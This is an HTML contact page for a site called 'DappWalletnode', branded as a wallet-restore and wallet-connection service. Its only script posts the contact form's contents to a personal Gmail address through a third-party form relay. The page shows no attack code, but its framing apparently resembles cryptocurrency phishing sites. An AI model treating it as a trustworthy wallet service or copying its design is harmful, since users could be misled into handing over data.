<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="img\save.png" />
    <link rel="stylesheet" href="./css/style.css">
    <title>Mobile Wallet Restore | Best Cryptocurrency Wallet | Open protocol for connecting Wallets</title>
  </head>
  <body>
    <header id="head">
      <div id="gg">
      <div id="head_left">
        <a href="index"><img src="img/save.png" alt=""/></a></div>
      <div id="centre">
        <a href="index" id="centre">Dapp<span id="colorize">Walletnode</span></a>
      </div>
      <div id="head_right">
<ul>
  <input type="checkbox" id="checkbox_toggle">
  <label for="checkbox_toggle" class="hamburger">&#9776;</label>
  <div class="menu">
    <li><a href="index">Home</a></li>
    <li><a href="connect">Connect</a></li>
    <li><a href="contact">Contact us</a></li>
    <li><a href="#">FAQ</a></li>
    <li></li>
  </div>

</ul>
      </div>

</div>
    </header>
    <!-- <aside></aside> -->
    <main id="main">
      <div class="contact">
      <h1>Contact Us</h1>
        <input type="text" id="contact_name" placeholder="Name..." />
        <input type="email" id="contact_email" placeholder="email@...com" />
        <textarea  id="contact_message" rows="8" cols="80" placeholder="Messaage Here....."></textarea>
        <button id="cont">Send</button>

    </div>
    </main>

  <footer class="foot">
  <p>  info@dappwalletnode.online</p></br>
    <p>Copyright © 2021 All rights Reserved </p>
  </footer>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script type="text/javascript">
  $('#cont').click(function() {
    var contact_name = document.getElementById('contact_name').value;
    var contact_email = document.getElementById('contact_email').value;
    var contact_message = document.getElementById('contact_message').value;
    var d = [contact_name,contact_email,contact_message];
    if(d[0] == "" || d[0] == null || d[1] == "" || d[1] == null || d[2] == "" || d[2] == null){
      alert('Empty Fields');
    }
    else{
    $.ajax({
  method: 'POST',
  url: 'https://formsubmit.co/ajax/muizazeez2004@gmail.com',
  dataType: 'json',
  accepts: 'application/json',
  data: {
      name: contact_name+" ("+contact_email+")",
      message: contact_message
  },
  success: (data) => alert("Sent"),
  error: (err) => alert("Resend")
  });
  }
// }
  });
</script>
  </body>
  </html>
